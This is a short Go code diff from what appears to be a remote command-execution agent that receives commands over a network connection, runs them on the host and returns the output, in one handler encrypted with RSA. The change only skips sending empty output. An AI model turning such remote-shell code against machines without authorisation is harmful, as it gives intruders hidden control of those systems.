@@ -43,7 +43,9 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		// Execute the command
 		var output string = Execute_on_OS(OS_info, command)
 		var formatted_output string = strings.TrimSpace(output)
-
+		if len(formatted_output) == 0 {
+			continue
+		}
 		_, err = updated_conn.Write([]byte(formatted_output))
 
 		// Incase connection issues occur just before the response is sent
@@ -101,7 +103,7 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 			fmt.Println("Error decrypting command:", err)
 			continue
 		}
-		
+
 		if len(command) == 0 {
 			time.Sleep(1 * time.Second) // Prevent high CPU usage
 			continue
@@ -110,6 +112,9 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 		// Execute the command
 		var output string = Execute_on_OS(OS_info, command)
 		var formatted_output string = strings.TrimSpace(output)
+		if len(formatted_output) == 0 {
+			continue
+		}
 
 		// Encrypt and send the output back to the client
 		encrypted_output, err := EncryptMessageRSA(formatted_output, public_key)
